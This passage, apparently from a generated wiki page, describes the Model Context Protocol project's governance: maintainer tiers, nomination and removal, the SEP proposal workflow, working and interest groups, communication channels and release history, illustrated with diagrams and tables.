- Administrator access to all infrastructure (GitHub organizations, Discord, communication channels)
- Public articulation of decision-making and rationale

**Sources:** [MAINTAINERS.md:7-10](), [docs/community/governance.mdx:65-72]()

### Core Maintainers

The Core Maintainers team consists of 9 members with deep understanding of the protocol specification:

| Name | GitHub Handle |
|------|---------------|
| Inna Harper | `@ihrpr` |
| Basil Hosmer | `@bhosmer-ant` |
| Paul Carleton | `@pcarleton` |
| Nick Cooper | `@nicknotfun` |
| Nick Aldridge | `@000-000-000-000-000` |
| Che Liu | - |
| Den Delimarsky | `@localden` |

Core Maintainers are responsible for:
- Designing, reviewing, and steering specification evolution
- Articulating long-term vision
- Mediating disputes and making decisive choices
- Appointing/removing Maintainers
- Veto power over Maintainer decisions by majority vote

Core Maintainers meet bi-weekly to discuss proposals and vote on SEPs. They generally use the same contribution mechanisms (pull requests) as external contributors.

**Sources:** [MAINTAINERS.md:12-21](), [docs/community/governance.mdx:51-64](), [docs/community/governance.mdx:172-184]()

### Maintainers

The project has 58 Maintainers organized into three categories:

#### SDK Maintainers

Responsible for language-specific SDK implementations:
- **Java SDK**: Christian Tzolov, Dariusz Jędrzejczyk, Daniel Garnier-Moiroux
- **Ruby SDK**: Topher Bullock, Koichi Ito, Ateş Göral
- **Swift SDK**: Matt Zmuda, Carl Peaslee
- **Go SDK**: Rob Findley, Jonathan Amsterdam, Sam Thanawalla
- **C# SDK**: Stephan Halter, Mike Kistler
- **Kotlin SDK**: Leonid Stashevsky, Sergey Ignatov
- **Python SDK**: Inna Harper, Jerome Swannack, Marcelo Trylesinski, Max Isbey
- **TypeScript SDK**: Inna Harper, Felix Weinberger, Olivier Chafik
- **Rust SDK**: Alex Hancock, Michael Bolin
- **PHP SDK**: Kyrian Obikwelu, Christopher Hertel

#### Project Maintainers

Maintain specific MCP ecosystem projects:
- **use-mcp**: Glen Maddern
- **Inspector**: Cliff Hall, Konstantin Konstantinov, Ola Hungerford
- **Registry**: Toby Padilla, Tadas Antanavicius, Adam Jones, Radoslav Dimitrov
- **MCPB (Model Context Protocol Bundle)**: Alexander Sklar, Adam Jones, Joan Xie
- **Reference Servers**: Ola Hungerford, Cliff Hall, Tadas Antanavicius, Shaun Smith, Jonathan Hefner

#### Working Group/Interest Group Maintainers

Lead focused collaborative efforts:
- **Security Interest Group**: Den Delimarsky, Paul Carleton, Jenn Newton
- **Authorization Interest Group**: Aaron Parecki, Darin McAdams, Paul Carleton
- **Client Implementor Interest Group**: Representatives from major clients (Goose, Zed, VS Code, Codex, GitHub Copilot, Cursor)
- **Financial Services Interest Group**: Sambhav Kothari, Peder Holdgaard Pedersen
- **Transports Interest Group**: Kurtis Van Gent, Jonathan Hefner, Shaun Smith, Harvey Tuch
- **Server Identity Working Group**: Nick Cooper
- **Agents Working Group**: Peter Alexander, Luca Chang, Inna Harper
- **MCP Apps Working Group**: Liad Yosef, Ido Salomon

**Sources:** [MAINTAINERS.md:22-175](), [docs/community/governance.mdx:36-49]()

### Nomination and Removal Process

```mermaid
graph TD
    Propose["Maintainer/Core<br/>Proposes Nomination"]
    Evidence["Collect Evidence<br/>PR history, contributions"]
    Discuss["Discuss Among<br/>Relevant Maintainer Group"]
    Channel["Create Private Discord Channel<br/>nomination-{name}-{group}"]
    Context["Provide Context<br/>Profile, contributions, capacity"]
    Poll["Discord Poll<br/>Core/Lead Maintainers Vote"]
    Decision{"Favorable?"}
    Add["Add to GitHub & Discord<br/>Update MAINTAINERS.md"]
    Announce["Announce in<br/>Relevant Discord Channel"]
    Archive["Delete Private Channel<br/>After 1 Week"]
    
    Propose --> Evidence
    Evidence --> Discuss
    Discuss --> Channel
    Channel --> Context
    Context --> Poll
    Poll --> Decision
    Decision -->|"Yes"| Add
    Decision -->|"No"| Archive
    Add --> Announce
    Announce --> Archive
    
    style Decision fill:#f9f9f9
```

Maintainers can be appointed or removed at any time by Core/Lead Maintainers. The nomination process defined in [docs/community/governance.mdx:150-171]() requires:
1. Evidence of contributions (merged PRs)
2. Support from existing maintainer group
3. Private Discord channel for discussion
4. Vote by Core/Lead Maintainers
5. Documentation update in `MAINTAINERS.md`

Membership is for individuals, not companies, ensuring maintainers act in the protocol's best interests.

**Sources:** [docs/community/governance.mdx:136-171](), [MAINTAINERS.md:176-180]()

## Decision-Making Process

### Meeting Cadence

- **Core Maintainer Meetings**: Bi-weekly to discuss proposals, vote on SEPs, and address project direction
- **In-Person Meetings**: Lead, Core, and Maintainers meet every 3-6 months for deeper collaboration
- **Working Group Meetings**: Published on [meet.modelcontextprotocol.io](https://meet.modelcontextprotocol.io/)

Meeting notes for technical decisions are made public on GitHub or Discord.

**Sources:** [docs/community/governance.mdx:73-78](), [docs/community/governance.mdx:127-134](), [docs/community/working-interest-groups.mdx:25-30]()

### Transparency Requirements

All technical and governance decisions must be:
- Documented publicly in GitHub Discussions, Issues, or SEPs
- Labeled with `notes` for decision records
- Made available on Discord's public channels

Private channels exist only for:
- Security incidents (CVEs, vulnerabilities)
- People matters (code of conduct, maintainer discussions)
- Matters requiring immediate focused response

**Sources:** [docs/community/communication.mdx:41-54](), [docs/community/governance.mdx:32-35]()

## Specification Enhancement Proposal (SEP) Process

The SEP process is the primary mechanism for proposing major changes to the MCP specification. As of November 2025, SEPs follow a PR-based workflow defined in SEP-1850.

### SEP Workflow

```mermaid
stateDiagram-v2
    [*] --> Draft: Author creates 0000-feature.md
    Draft --> PR_Created: Submit to seps/ directory
    PR_Created --> Renumber: PR number assigned
    Renumber --> Seeking_Sponsor: Update file to {PR}-feature.md
    Seeking_Sponsor --> Sponsored: Maintainer assigns as sponsor
    Sponsored --> InReview: Sponsor updates status to in-review
    InReview --> Accepted: Core Maintainers approve
    InReview --> Rejected: Core Maintainers reject
    InReview --> Revision: Feedback requires changes
    Revision --> InReview: Updates made
    Accepted --> Final: Reference implementation complete
    Seeking_Sponsor --> Dormant: No sponsor after 6 months
    Draft --> Withdrawn: Author withdraws
    Final --> Superseded: Replaced by newer SEP
    Rejected --> [*]
    Dormant --> [*]
    Withdrawn --> [*]
    Superseded --> [*]
    Final --> [*]
```

**Sources:** [seps/1850-pr-based-sep-workflow.md:1-181](), [docs/community/sep-guidelines.mdx:43-66]()

### SEP Anatomy

Each SEP file in the `seps/` directory follows this structure:

```markdown
# SEP-{NUMBER}: {Title}

- **Status**: Draft | In-Review | Accepted | Rejected | Withdrawn | Final | Superseded | Dormant
- **Type**: Standards Track | Informational | Process
- **Created**: YYYY-MM-DD
- **Author(s)**: Name <email> (@github-username)
- **Sponsor**: @github-username
- **PR**: https://github.com/modelcontextprotocol/specification/pull/{NUMBER}

## Abstract
## Motivation
## Specification
## Rationale
## Backward Compatibility
## Security Implications
## Reference Implementation
```

**File Structure:** [seps/TEMPLATE.md:1-86](), [seps/1850-pr-based-sep-workflow.md:83-106]()

**Sources:** [docs/community/sep-guidelines.mdx:68-80](), [seps/README.md:1-4]()

### SEP Types

| Type | Purpose | Example |
|------|---------|---------|
| **Standards Track** | New protocol features or changes | SEP-1686 (Tasks), SEP-991 (Auth) |
| **Informational** | Design issues, guidelines, recommendations | - |
| **Process** | Changes to governance or contribution processes | SEP-1850 (PR-based workflow) |

**Sources:** [docs/community/sep-guidelines.mdx:29-36]()

### Sponsor Responsibilities

A Sponsor (Core Maintainer or Maintainer) champions the SEP through review:

```mermaid
graph LR
    Author["SEP Author<br/>Writes Proposal"]
    Sponsor["Sponsor<br/>Reviews & Guides"]
    Community["Community<br/>Provides Feedback"]
    Core["Core Maintainers<br/>Formal Review"]
    
    Author -->|"requests sponsorship"| Sponsor
    Sponsor -->|"provides feedback"| Author
    Community -->|"comments on PR"| Author
    Sponsor -->|"updates status field"| Author
    Sponsor -->|"applies PR labels"| Author
    Sponsor -->|"presents proposal"| Core
    Core -->|"approves/rejects"| Sponsor
    Sponsor -->|"updates to Final"| Author
    
    style Sponsor fill:#f9f9f9
```

Sponsors are responsible for:
- Reviewing proposals and requesting changes
- **Managing status transitions** in both the SEP markdown file and PR labels
- Presenting SEPs at Core Maintainer meetings
- Ensuring quality standards before advancement
- Tracking reference implementation completion

**Sources:** [seps/1850-pr-based-sep-workflow.md:48-63](), [docs/community/sep-guidelines.mdx:120-130]()

### Recent SEP Evolution

The PR-based workflow was formalized in SEP-1850 (November 2025) to address issues with the previous GitHub Issues-based approach:

**Problems Solved:**
- Scattered content across issues, documents, and PRs
- Difficult multi-contributor collaboration
- Limited version control
- Unclear status management

**New Approach:**
- SEPs live in `seps/{NUMBER}-{slug}.md` as canonical source
- PR number becomes SEP number (eliminates manual bookkeeping)
- Git provides full revision history
- Status tracked in both markdown file and PR labels

**Sources:** [seps/1850-pr-based-sep-workflow.md:16-31](), [blog/content/posts/2025-11-28-sep-process-update.md:1-69]()

### SEP Acceptance Criteria

For a SEP to reach `Final` status:
- Prototype implementation demonstrating the proposal
- Clear benefit to the MCP ecosystem
- Community support and consensus
- Reference implementation complete and incorporated into the specification

**Sources:** [docs/community/sep-guidelines.mdx:107-117]()

## Working Groups and Interest Groups

MCP collaboration is organized through two complementary structures introduced in SEP-1302.

### Structure Comparison

| Aspect | Interest Groups (IGs) | Working Groups (WGs) |
|--------|----------------------|---------------------|
| **Purpose** | Identify and discuss problems | Develop concrete solutions |
| **Output** | Problem articulation, discussions | SEPs, implementations |
| **Lifecycle** | No expiration while active | Ends when deliverables complete |
| **Formation** | Majority vote by community moderators | Majority vote by community moderators |
| **Requirements** | Regular meetings OR Discord activity | Active SEP/PR OR project maintenance |

**Sources:** [docs/community/working-interest-groups.mdx:1-116]()

### Interest Groups

```mermaid
graph TB
    subgraph "Interest Groups - Problem Identification"
        Security["Security IG<br/>security-ig Discord channel<br/>Maintainers: Den Delimarsky, Paul Carleton, Jenn Newton"]
        Auth["Authorization IG<br/>auth-ig Discord channel<br/>Maintainers: Aaron Parecki, Darin McAdams, Paul Carleton"]
        ClientImpl["Client Implementor IG<br/>client-implementor-ig channel<br/>Representatives from major clients"]
        Finance["Financial Services IG<br/>Maintainers: Sambhav Kothari, Peder Holdgaard Pedersen"]
        Transports["Transports IG<br/>Maintainers: Kurtis Van Gent, Jonathan Hefner, Shaun Smith, Harvey Tuch"]
    end
    
    Security -.informs.-> AuthWG
    Auth -.informs.-> AuthWG
    
    subgraph "Working Groups - Solution Development"
        AuthWG["Agents WG<br/>Maintainers: Peter Alexander, Luca Chang, Inna Harper"]
        ServerID["Server Identity WG<br/>Maintainer: Nick Cooper"]
        MCPApps["MCP Apps WG<br/>Maintainers: Liad Yosef, Ido Salomon"]
    end
    
    AuthWG -.produces.-> SEP["SEPs & Implementations"]
    ServerID -.produces.-> SEP
    MCPApps -.produces.-> SEP
```

**Sources:** [docs/community/working-interest-groups.mdx:31-70](), [MAINTAINERS.md:121-175]()

### Creation Process

To create a new WG or IG:
1. Fill out template in `#wg-ig-group-creation` Discord channel
2. Community moderators call for vote in `#community-moderators`
3. Majority approval over 72 hours
4. Core/Lead Maintainers have veto power
5. Public Discord channel created
6. Meetings published on [meet.modelcontextprotocol.io](https://meet.modelcontextprotocol.io/)

**Template Fields:**
- Facilitator(s) (self-nominated, informal role)
- Maintainer(s) (optional, official MCP steering group representative)
- For IGs: Related groups and differentiation
- For WGs: First Issue/PR/SEP to work on

**Sources:** [docs/community/working-interest-groups.mdx:50-107]()

### Governance Principles

All WGs and IGs must:
- Document their contribution process
- Maintain transparent communication
- Make decisions publicly (publish meeting notes)
- Default to GitHub PRs/Issues and public Discord channels

**Sources:** [docs/community/working-interest-groups.mdx:91-108]()

## Communication Channels

### Channel Matrix

```mermaid
graph TB
    subgraph "Public Channels"
        Discord["Discord Server<br/>2,900+ members<br/>100+ new weekly<br/>discord.gg/6CSzBmMkjX"]
        GitHub["GitHub Discussions<br/>Structured long-form<br/>github.com/modelcontextprotocol/modelcontextprotocol"]
        Issues["GitHub Issues<br/>Bug reports, tasks<br/>Multiple repositories"]
        PRs["Pull Requests<br/>Code & SEP submissions<br/>seps/ directory"]
    end
    
    subgraph "Private Channels (Exceptions)"
        Security["Security Incidents<br/>CVEs, vulnerabilities"]
        People["People Matters<br/>Code of conduct"]
        Incident["Incident Rooms<br/>Immediate response"]
    end
    
    Discord -->|"moves to"| GitHub
    Discord -->|"leads to"| Issues
    GitHub -->|"creates"| PRs
    Issues -->|"references"| PRs
    
    Private -.documented in.-> Issues
    Private -.documented in.-> GitHub
```

**Sources:** [docs/community/communication.mdx:1-107]()

### Discord Server

The MCP Discord is designed for **contributors**, not general user support. Structure:

**Public Channels (Default):**
- SDK development (`#typescript-sdk-dev`, etc.)
- Working/Interest Group channels
- Project development (`#inspector-dev`, `#registry-dev`)
- Community onboarding
- Office hours

**Private Channels (Exceptions):**
- Security incidents
- Maintainer coordination
- People matters (code of conduct)

**Key Rules:**
- Avoid service/product marketing
- No MCP user support (use documentation and GitHub Discussions)
- All technical decisions must be documented publicly
- Private channels are temporary "incident rooms"

**Sources:** [docs/community/communication.mdx:19-56]()

### Decision Record Storage

```mermaid
graph LR
    Tech["Technical Decisions"]
    Spec["Spec Changes"]
    Process["Process Changes"]
    Gov["Governance Updates"]
    
    Tech --> GHIssues["GitHub Issues<br/>github.com/.../issues"]
    Tech --> SEPs["SEPs<br/>seps/ directory"]
    
    Spec --> Changelog["Changelog<br/>modelcontextprotocol.io/<br/>specification/draft/changelog"]
    
    Process --> CommDocs["Community Docs<br/>modelcontextprotocol.io/<br/>community/governance"]
    
    Gov --> GHIssues
    Gov --> SEPs
    
    style GHIssues fill:#f9f9f9
    style SEPs fill:#f9f9f9
```

**Sources:** [docs/community/communication.mdx:89-97]()

## Release History and Cadence

### Quarterly Release Cycle

MCP follows a quarterly release cadence with versions named `YYYY-MM-DD` representing the date of the last breaking change:

| Version | Date | Key Features |
|---------|------|-------------|
| 2024-11-05 | Nov 2024 | Initial release |
| 2025-03-26 | Mar 2025 | - |
| 2025-06-18 | Jun 2025 | JSON Schema draft-07 (legacy) |
| **2025-11-25** | Nov 2025 | Tasks (SEP-1686), Simplified Auth (SEP-991), Sampling with Tools (SEP-1577) |
| Draft | Ongoing | Active development |

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:130-265]()

### 2025-11-25 Release Highlights

```mermaid
graph TD
    Release["2025-11-25 Release<br/>First Anniversary"]
    
    Tasks["SEP-1686: Task-based Workflows<br/>States: working, input_required, completed, failed, cancelled<br/>Active polling, Result retrieval, Lifecycle management"]
    
    Auth["SEP-991: Simplified Authorization<br/>Client ID Metadata Documents (CIMD)<br/>URL-based registration, Eliminates DCR complexity"]
    
    Security["Security & Enterprise<br/>SEP-1024: Local server security<br/>SEP-835: Default scopes"]
    
    Extensions["Extensions Framework<br/>Optional, Additive, Composable<br/>SEP-1046: OAuth client credentials<br/>SEP-990: Enterprise IdP (Cross App Access)"]
    
    Elicitation["SEP-1036: URL Mode Elicitation<br/>Out-of-band credential flows<br/>OAuth in browser, No client passthrough"]
    
    Sampling["SEP-1577: Sampling with Tools<br/>Agentic servers, Tool calling in sampling<br/>Parallel execution, Server-side loops"]
    
    Release --> Tasks
    Release --> Auth
    Release --> Security
    Release --> Extensions
    Release --> Elicitation
    Release --> Sampling
    
    style Release fill:#f9f9f9
```

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:130-251]()

### Community Growth Metrics

**As of November 2025:**

- **58 Maintainers** supporting 9 Core/Lead Maintainers
- **2,900+ contributors** in Discord
- **100+ new contributors** joining weekly
- **~2,000 servers** in MCP Registry (407% growth since September 2024)
- **96+ clients** documented
- **17 SEPs** delivered in approximately one quarter

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:122](), [blog/content/posts/2025-11-25-first-mcp-anniversary.md:28]()

## Legal and Licensing

MCP is established as **Model Context Protocol a Series of LF Projects, LLC**. Key policies:

- **Code License**: Apache License, Version 2.0 for all code and specification contributions
- **Documentation License**: Creative Commons Attribution 4.0 International (excluding specifications)
- **Copyright**: Contributors retain copyright as independent works; no assignment required
- **Alternative Licenses**: Core Maintainers may approve exceptions on a case-by-case basis
- **Governance Changes**: Must be approved by both the maintainer process and LF Projects, LLC

Full policies at [lfprojects.org/policies](https://www.lfprojects.org/policies/)

**Sources:** [docs/community/governance.mdx:8-18](), [GOVERNANCE.md:1-12]()

## Getting Involved

### Contribution Path

```mermaid
graph TB
    Start["Join Discord<br/>discord.gg/6CSzBmMkjX"]
    Participate["Participate in IGs<br/>Follow conversations<br/>Attend live calls"]
    Facilitate["Facilitate Calls<br/>Contribute use cases<br/>Help with SEP proposals"]
    Contribute["Contribute to WGs<br/>Work on deliverables<br/>Submit PRs"]
    Nominate["Active Contributors<br/>Nominated as Maintainers"]
    
    Start --> Participate
    Participate --> Facilitate
    Facilitate --> Contribute
    Contribute --> Nominate
    
    style Start fill:#f9f9f9
    style Nominate fill:#f9f9f9
```

**Sources:** [docs/community/working-interest-groups.mdx:117-126]()

### Key Resources

- **Governance Documentation**: [modelcontextprotocol.io/community/governance](https://modelcontextprotocol.io/community/governance)
- **SEP Guidelines**: [modelcontextprotocol.io/community/sep-guidelines](https://modelcontextprotocol.io/community/sep-guidelines)
- **Discord**: [discord.gg/6CSzBmMkjX](https://discord.gg/6CSzBmMkjX)
- **GitHub**: [github.com/modelcontextprotocol](https://github.com/modelcontextprotocol)
- **Meeting Calendar**: [meet.modelcontextprotocol.io](https://meet.modelcontextprotocol.io/)
- **Maintainer List**: [MAINTAINERS.md](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/MAINTAINERS.md)

**Sources:** [docs/community/communication.mdx:10-16](), [docs/community/working-interest-groups.mdx:25-30]()

---

# Page: Governance Structure

# Governance Structure

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [MAINTAINERS.md](MAINTAINERS.md)
- [docs/community/antitrust.mdx](docs/community/antitrust.mdx)
- [docs/community/communication.mdx](docs/community/communication.mdx)
- [docs/community/contributing.mdx](docs/community/contributing.mdx)
- [docs/community/governance.mdx](docs/community/governance.mdx)
- [docs/community/sep-guidelines.mdx](docs/community/sep-guidelines.mdx)
- [docs/community/seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.mdx](docs/community/seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.mdx)
- [docs/community/seps/2133-extensions.mdx](docs/community/seps/2133-extensions.mdx)
- [docs/community/seps/index.mdx](docs/community/seps/index.mdx)
- [docs/community/working-interest-groups.mdx](docs/community/working-interest-groups.mdx)
- [docs/docs.json](docs/docs.json)
- [docs/docs/tutorials/security/security_best_practices.mdx](docs/docs/tutorials/security/security_best_practices.mdx)
- [docs/specification/2024-11-05/index.mdx](docs/specification/2024-11-05/index.mdx)
- [docs/specification/2025-03-26/index.mdx](docs/specification/2025-03-26/index.mdx)
- [docs/specification/2025-06-18/index.mdx](docs/specification/2025-06-18/index.mdx)
- [docs/specification/2025-11-25/index.mdx](docs/specification/2025-11-25/index.mdx)
- [docs/specification/draft/index.mdx](docs/specification/draft/index.mdx)
- [schema/draft/examples/ClientCapabilities/extensions-ui-mime-types.json](schema/draft/examples/ClientCapabilities/extensions-ui-mime-types.json)
- [schema/draft/examples/ServerCapabilities/extensions-ui.json](schema/draft/examples/ServerCapabilities/extensions-ui.json)
- [seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.md](seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.md)
- [seps/2133-extensions.md](seps/2133-extensions.md)

</details>



This document describes the hierarchical governance model for the Model Context Protocol project, including the roles, responsibilities, and authority relationships between Lead Maintainers, Core Maintainers, and Maintainers. For the complete list of current maintainers, see [Maintainers Directory](#7.2). For information about Working Groups and Interest Groups, see [Working Groups and Interest Groups](#7.3). For SEP procedures, see [Specification Enhancement Process](#6.2).

## Purpose and Scope

The MCP project adopts a three-tier hierarchical governance structure similar to Python, PyTorch, and other major open source projects. This structure ensures clear decision-making authority while enabling distributed maintenance across multiple domains (SDKs, projects, working groups). The governance model balances the need for decisive leadership with community participation and transparent processes.

## Hierarchical Authority Model

The governance structure consists of three levels of maintainership, each with distinct responsibilities and authority:

```mermaid
graph TB
    subgraph "Authority Hierarchy"
        Lead["Lead Maintainers (BDFL)<br/>2 Members<br/>Justin Spahr-Summers (inactive)<br/>David Soria Parra"]
        Core["Core Maintainers<br/>9 Members<br/>Specification Oversight"]
        Maint["Maintainers<br/>58 Total Members<br/>Domain Specialists"]
        
        Lead -->|"appoint/remove"| Core
        Core -->|"appoint/remove"| Maint
        Lead -->|"veto power"| Core
        Core -->|"veto by majority"| Maint
    end
    
    subgraph "Maintained Domains"
        SDK["SDK Maintainers<br/>Java, Python, TypeScript<br/>Ruby, Swift, Go, C#<br/>Kotlin, Rust, PHP"]
        Proj["Project Maintainers<br/>use-mcp, Inspector<br/>Registry, MCPB<br/>Reference Servers"]
        Groups["WG/IG Maintainers<br/>Security, Authorization<br/>Financial Services<br/>Transports, Agents, etc."]
        CommunityMod["Community Moderators<br/>5 Members<br/>Discord Management"]
    end
    
    Maint -->|"maintain"| SDK
    Maint -->|"maintain"| Proj
    Maint -->|"maintain"| Groups
    Maint -->|"some overlap"| CommunityMod
    
    subgraph "Decision Authority"
        Steering["MCP Steering Group<br/>Lead + Core + Maintainers<br/>All governance decisions"]
    end
    
    Lead -.member of.-> Steering
    Core -.member of.-> Steering
    Maint -.member of.-> Steering
```

**Sources:** [docs/community/governance.mdx:20-78](), [MAINTAINERS.md:7-175]()

The governance hierarchy implements a clear chain of authority with explicit veto powers. Lead Maintainers can veto any decision by Core Maintainers or Maintainers. Core Maintainers can veto decisions by Maintainers through majority vote. This structure is often referred to as "Benevolent Dictator for Life" (BDFL) in open source governance.

## Governance Roles and Responsibilities

### Lead Maintainers

The two Lead Maintainers serve as the ultimate decision-makers for the MCP project:

| Current Lead Maintainers | Status |
|-------------------------|--------|
| David Soria Parra | Active |
| Justin Spahr-Summers | Currently Inactive |

**Authority:**
- Veto power over any decision by Core Maintainers or Maintainers
- Confirm or remove Core Maintainers
- Administrator access to all infrastructure (Discord, GitHub organizations, repositories)
- Ultimate responsibility for project direction

**Decision-Making:**
- Must publicly articulate decisions with clear reasoning
- Part of the Core Maintainer group
- Expected to meet with other maintainer groups every 3-6 months

**Sources:** [docs/community/governance.mdx:65-72](), [MAINTAINERS.md:7-10]()

### Core Maintainers

Nine Core Maintainers provide specification oversight and strategic direction:

```mermaid
graph LR
    subgraph "Core Maintainer Responsibilities"
        Spec["Specification Evolution<br/>Design and review<br/>SEP oversight"]
        Vision["Long-term Vision<br/>Cohesive direction<br/>Project roadmap"]
        Mediation["Dispute Resolution<br/>Fair and transparent<br/>Consensus seeking"]
        Appoint["Maintainer Management<br/>Appoint/remove<br/>Maintainers"]
        Stewardship["Project Stewardship<br/>Best interests of MCP<br/>Community representation"]
    end
    
    subgraph "Core Maintainer Powers"
        Veto["Veto Power<br/>Majority vote can veto<br/>Maintainer decisions"]
        Write["Repository Access<br/>Write/admin access<br/>All MCP repositories"]
        Meetings["Decision Forums<br/>Bi-weekly meetings<br/>Discord discussions"]
    end
    
    Spec --> Vision
    Vision --> Mediation
    Mediation --> Appoint
    Appoint --> Stewardship
    
    Veto -.supports.-> Mediation
    Write -.enables.-> Spec
    Meetings -.facilitates.-> Vision
```

**Current Core Maintainers (9 members):**
- Inna Harper
- Basil Hosmer
- Paul Carleton
- Nick Cooper
- Nick Aldridge
- Che Liu
- Den Delimarsky
- (2 positions not listed individually)

**Key Responsibilities:**
- Deep understanding of MCP specification required
- Design, review, and steer specification evolution
- Articulate long-term vision
- Mediate contentious issues
- Appoint or remove Maintainers
- Manage SEP process and reviews

**Decision Process:**
- Bi-weekly meetings for proposals and voting
- Private Discord channel for coordination
- Can use public Discord for smaller proposals
- Must document decisions publicly
- Attempt to meet in person every 3-6 months

**Sources:** [docs/community/governance.mdx:51-63](), [docs/community/governance.mdx:172-180]()

### Maintainers

58 Maintainers manage specific components, working groups, and interest groups:

```mermaid
graph TB
    subgraph "SDK Maintainers - 28 Members"
        Java["Java SDK<br/>tzolov, chemicL, Kehrlann"]
        Ruby["Ruby SDK<br/>topherbullock, koic, atesgoral"]
        Swift["Swift SDK<br/>mattt, carlpeaslee"]
        Go["Go SDK<br/>findleyr, jba, samthanawalla"]
        CSharp["C# SDK<br/>halter73, mikekistler"]
        Kotlin["Kotlin SDK<br/>e5l, ignatov"]
        Python["Python SDK<br/>ihrpr, jerome3o, Kludex, maxisbey"]
        TypeScript["TypeScript SDK<br/>ihrpr, felixweinberger, ochafik"]
        Rust["Rust SDK<br/>alexhancock, bolinfest"]
        PHP["PHP SDK<br/>CodeWithKyrian, chr-hertel"]
    end
    
    subgraph "Project Maintainers - 15 Members"
        UseMCP["use-mcp<br/>geelen"]
        Inspector["Inspector<br/>cliffhall, KKonstantinov, olaservo"]
        Registry["Registry<br/>toby, tadasant, domdomegg, rdimitrov"]
        MCPB["MCPB (Bundle)<br/>asklar, domdomegg, joan-anthropic"]
        RefServers["Reference Servers<br/>olaservo, cliffhall, tadasant<br/>evalstate, jonathanhefner"]
    end
    
    subgraph "WG/IG Maintainers - 15 Members"
        Security["Security IG<br/>dend, pcarleton, jenn-newton"]
        Auth["Authorization IG<br/>aaronpk, D-McAdams, pcarleton"]
        ClientImpl["Client Implementor IG<br/>7 members (VS Code, Zed,<br/>GitHub Copilot, etc.)"]
        Financial["Financial Services IG<br/>sambhav, PederHP"]
        Transports["Transports IG<br/>kurtisvg, jonathanhefner<br/>evalstate, htuch"]
        ServerID["Server Identity WG<br/>nicknotfun"]
        Agents["Agents WG<br/>pja-ant, LucaButBoring, ihrpr"]
        MCPApps["MCP Apps WG<br/>liady, idosal"]
    end
```

**Maintainer Categories:**

| Category | Count | Examples |
|----------|-------|----------|
| SDK Maintainers | 28 | Java (3), Python (4), TypeScript (3), Ruby (3), Swift (2), Go (3), C# (2), Kotlin (2), Rust (2), PHP (2) |
| Project Maintainers | 15 | Inspector (3), Registry (4), Reference Servers (5), use-mcp (1), MCPB (3) |
| WG/IG Maintainers | 15 | Security IG (3), Authorization IG (3), Client Implementor IG (7), Financial Services IG (2), Transports IG (4), Server Identity WG (1), Agents WG (3), MCP Apps WG (2) |
| Community Moderators | 5 | olaservo, cliffhall, evalstate, jonathanhefner, tadasant |

**Key Responsibilities:**
- Thoughtful engagement with community contributors
- Maintain and improve their area of the MCP project
- Support documentation, roadmaps, and adjacent parts
- Present community ideas to Core Maintainers
- Independent decision-making for their domains
- Can defer or escalate to Core Maintainers when needed

**Authority:**
- Write and/or admin access to their respective repositories
- May adopt own rules and procedures for decisions
- Expected to make decisions independently

**Sources:** [docs/community/governance.mdx:36-50](), [MAINTAINERS.md:22-175]()

## Maintainer Appointment and Removal

### Nomination Process

The maintainer nomination process follows a structured workflow defined in the governance documentation:

```mermaid
graph TD
    Nominator["Nominator<br/>(Maintainer, Core, or Lead)"]
    Evidence["Collect Evidence<br/>- Merged PRs<br/>- Contribution history<br/>- GitHub profile"]
    Discuss["Discuss with Group<br/>- Relevant maintainers<br/>- Support assessment"]
    Channel["Create Private Channel<br/>nomination-{name}-{group}<br/>Add core/lead maintainers"]
    Context["Provide Context<br/>- Profile links<br/>- Contribution description<br/>- Expected contributions<br/>- Other context"]
    Vote["Discord Poll<br/>Core/Lead Maintainers vote<br/>Yes/No consensus encouraged"]
    Decision{"Favorable?"}
    Add["Update Roles<br/>- GitHub permissions<br/>- Discord roles<br/>- Announce publicly"]
    Cleanup["Archive Channel<br/>Delete after 1 week"]
    
    Nominator --> Evidence
    Evidence --> Discuss
    Discuss --> Channel
    Channel --> Context
    Context --> Vote
    Vote --> Decision
    Decision -->|Yes| Add
    Decision -->|No| Cleanup
    Add --> Cleanup
```

**Nomination Requirements:**
- Membership given to individuals (not companies) on merit basis
- Must demonstrate strong expertise through contributions, reviews, discussions
- Must align with overall MCP principles and direction
- No term limits for maintainers or core maintainers
- Light criteria for moving to 'emeritus' status after long inactivity periods

**Information to Include:**
- GitHub profile link, LinkedIn profile link, Discord username
- Target maintainer group(s)
- Agreement from existing group members
- Description of contributions to date with links
- Expected future contributions and capacity
- Current employer and motivations
- Any other relevant context

**Sources:** [docs/community/governance.mdx:150-171](), [docs/community/governance.mdx:136-149]()

### Authority Flow

```mermaid
graph LR
    subgraph "Appointment Authority"
        LA["Lead Maintainers"]
        CA["Core Maintainers"]
        MA["Maintainers"]
        
        LA -->|"appoint/remove"| CA
        CA -->|"appoint/remove"| MA
    end
    
    subgraph "Veto Authority"
        LV["Lead Veto<br/>Any decision"]
        CV["Core Veto<br/>Majority vote on<br/>Maintainer decisions"]
        
        LA -.can execute.-> LV
        CA -.can execute.-> CV
    end
    
    subgraph "Consideration Flow"
        MC["Maintainer<br/>Recommendations"]
        CC["Core Maintainer<br/>Consideration"]
        
        MA -.provides.-> MC
        MC -.informs.-> CC
        CC -.informs.-> CA
    end
```

**Removal Process:**
- Core Maintainers responsible for adding/removing Maintainers
- Lead Maintainers responsible for adding/removing Core Maintainers
- Core Maintainers take consideration of existing maintainers into account
- No formal reason required for removal
- Can happen "at any time and without reason"

**Sources:** [docs/community/governance.mdx:145-149](), [docs/community/governance.mdx:47-48]()

## Decision-Making Process

### Decision Venues

The MCP project uses multiple venues for different types of decisions:

| Venue | Purpose | Frequency | Participants |
|-------|---------|-----------|--------------|
| Core Maintainer Meetings | Proposals, voting, project direction | Bi-weekly | Core + Lead Maintainers |
| Discord (Shared Server) | Smaller proposals, async discussion | Ongoing | All Maintainers, Core, Lead |
| GitHub Issues | Actionable tasks, bug reports, feature tracking | Ongoing | All contributors |
| GitHub Discussions | Structured long-form discussion | Ongoing | All contributors |
| SEP Pull Requests | Specification changes | Per proposal | All contributors, reviewed by Core |
